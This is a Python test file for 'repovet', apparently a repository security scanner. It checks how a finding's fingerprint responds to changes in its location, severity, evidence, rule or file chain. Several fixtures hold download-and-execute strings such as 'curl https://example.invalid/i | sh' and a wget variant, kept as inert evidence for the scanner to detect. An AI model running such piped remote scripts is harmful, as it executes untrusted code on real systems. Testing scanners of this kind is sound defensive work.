"""Finding identity remains stable where matching is justified, not as an integrity claim."""

from dataclasses import replace
from pathlib import Path

from repovet.identity import enrich_findings, fingerprint, normalize_content
from repovet.limits import Limits
from repovet.models import Chain, Confidence, Finding, Location, Severity
from repovet.sources.tree import LinkEntry


def finding(path: str = "src/check.sh", line: int = 4) -> Finding:
    return Finding(
        rule_id="RC-DLX-001",
        title="Download command",
        category="danger",
        area="download_exec",
        severity=Severity.MEDIUM,
        confidence=Confidence.HIGH,
        location=Location(path, line),
        message="Command downloads code",
        evidence="curl https://example.invalid/i | sh",
        rationale="Review the command",
        recommendation="Read the source first",
    )


class MemoryFile:
    def __init__(self, path: str, data: bytes) -> None:
        self.path, self.data, self.size = path, data, len(data)
        self.reads: list[int] = []

    def read_bytes(self, limit: int) -> bytes:
        self.reads.append(limit)
        return self.data[:limit]


class MemoryTree:
    label = "memory"

    def __init__(self, files: list[MemoryFile]) -> None:
        self._files = files

    def files(self) -> list[MemoryFile]:
        return self._files

    def links(self) -> list[LinkEntry]:
        return []


def test_line_shift_and_file_rename_preserve_identity() -> None:
    base = finding()
    head = replace(base, location=Location("lib/renamed.sh", 99))
    assert fingerprint(base) == fingerprint(head)


def test_severity_and_context_do_not_change_identity() -> None:
    base = finding()
    head = replace(base, severity=Severity.HIGH, context="test")
    assert fingerprint(base) == fingerprint(head)


def test_changed_matched_content_and_rule_change_identity() -> None:
    base = finding()
    assert fingerprint(base) != fingerprint(
        replace(base, evidence="wget -O- https://example.invalid/i | sh")
    )
    assert fingerprint(base) != fingerprint(replace(base, rule_id="RC-DLX-007"))


def test_normalization_preserves_meaningful_inner_whitespace() -> None:
    assert normalize_content(" \r\na\r\nb\r ") == "a\nb"
    assert normalize_content("echo 'a b'") != normalize_content("echo 'a  b'")


def test_raw_identity_material_controls_identity_before_rendering() -> None:
    base = replace(finding(), identity_material='{"value":"fixed"}')
    head = replace(base, message="different display text", evidence="shortened display text")
    assert fingerprint(base) == fingerprint(head)
    assert "fixed" not in fingerprint(base)


def test_file_level_message_path_is_not_an_identity_anchor() -> None:
    base = replace(finding(), evidence=None, message="src/check.sh is present")
    head = replace(base, location=Location("lib/other.sh"), message="lib/other.sh is present")
    assert fingerprint(base) == fingerprint(head)


def test_duplicate_findings_share_a_bucket_without_losing_multiplicity() -> None:
    first = finding("one.sh", 3)
    second = finding("two.sh", 30)
    assert fingerprint(first) == fingerprint(second)
    result = enrich_findings([first, second], MemoryTree([]), Limits())
    assert len(result) == 2
    assert result[0].fingerprint == result[1].fingerprint


def test_changed_chain_intermediate_file_changes_identity() -> None:
    chain = Chain(
        "chain-1", (Location("package.json"), Location("install.sh"), Location("payload.sh"))
    )
    base = replace(finding(), chain=chain)
    files = [
        MemoryFile("package.json", b"{}"),
        MemoryFile("install.sh", b"echo first"),
        MemoryFile("payload.sh", b"echo inert"),
    ]
    first = enrich_findings([base], MemoryTree(files), Limits())[0]
    files[1] = MemoryFile("install.sh", b"echo second")
    second = enrich_findings([base], MemoryTree(files), Limits())[0]
    assert first.evidence == second.evidence
    assert first.fingerprint != second.fingerprint


def test_chain_order_and_paths_are_significant_but_scan_ids_are_not() -> None:
    base = replace(finding(), chain=Chain("chain-1", (Location("a"), Location("b"))))
    assert base.chain is not None
    contents = {"a": "digest-a", "b": "digest-b"}
    assert fingerprint(base, chain_contents=contents) == fingerprint(
        replace(base, chain=Chain("chain-42", base.chain.steps)), chain_contents=contents
    )
    assert fingerprint(base, chain_contents=contents) != fingerprint(
        replace(base, chain=Chain("chain-1", tuple(reversed(base.chain.steps)))),
        chain_contents=contents,
    )


def test_chain_content_reads_are_bounded_and_cached() -> None:
    chain = Chain("chain-1", (Location("large"), Location("small")))
    base = replace(finding(), chain=chain)
    large, small = MemoryFile("large", b"too large"), MemoryFile("small", b"x")
    enriched = enrich_findings([base, base], MemoryTree([large, small]), Limits(max_file_size=3))
    assert large.reads == []
    assert small.reads == [4]
    assert enriched[0].fingerprint == enriched[1].fingerprint


def test_surrogate_text_is_hashed_without_exposing_or_encoding_it() -> None:
    value = fingerprint(replace(finding(), evidence="odd\udcffname"))
    assert value.startswith("repovet:v1:")
    assert value.isascii()


def test_raw_multiline_matches_normalize_line_endings_before_serialization(tmp_path: Path) -> None:
    from helpers import builtin_rules
    from repovet.engine.checks.base import Match
    from repovet.engine.context import ScanContext
    from repovet.engine.runner import make_finding
    from repovet.limits import DEFAULT_LIMITS
    from repovet.models import CoverageCollector
    from repovet.sources.local import LocalTree

    rules = builtin_rules()
    rule = rules.get("RC-DLX-001")
    assert rule is not None
    coverage = CoverageCollector()
    ctx = ScanContext(
        LocalTree(tmp_path, DEFAULT_LIMITS, coverage), rules, DEFAULT_LIMITS, coverage
    )
    unix = "curl https://example.invalid/i.sh |\nsh"
    windows = unix.replace("\n", "\r\n")
    one = make_finding(rule, "a.sh", Match(evidence=unix, values={"match": unix}), ctx)
    two = make_finding(rule, "a.sh", Match(evidence=windows, values={"match": windows}), ctx)
    assert fingerprint(one) == fingerprint(two)
